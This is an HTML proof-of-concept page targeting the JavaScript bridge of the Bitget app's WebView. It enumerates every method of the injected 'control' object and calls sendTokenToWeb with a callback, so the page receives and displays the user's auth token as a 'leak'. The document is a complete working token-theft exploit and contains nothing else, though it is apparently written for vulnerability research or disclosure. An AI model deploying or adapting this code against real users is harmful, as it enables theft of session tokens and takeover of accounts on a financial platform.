<!DOCTYPE html><html><head><title>Bitget WebView JSBridge PoC</title></head>
<body>
<h2>Bitget WebView JSBridge PoC</h2>
<pre id="out">running...</pre>
<script>
function log(s){document.getElementById('out').textContent += "\n" + s;}
function pocCallback(data){
  log("LEAK RECEIVED:");
  try { log(JSON.stringify(data)); } catch(e){ log(String(data)); }
}
setTimeout(function(){
  if (window.control) {
    log("control object present");
    var apis = [];
    for (var k in control) { apis.push(k); }
    log("TOTAL KEYS: " + apis.length);
    for (var i = 0; i < apis.length; i++) { log("[" + i + "] " + apis[i]); }
    try { control.sendTokenToWeb('pocCallback'); log("sendTokenToWeb called"); } catch(e){ log("sTTW err: "+e); }
  } else { log("NO control object"); }
  log("done");
}, 800);
</script>
</body></html>
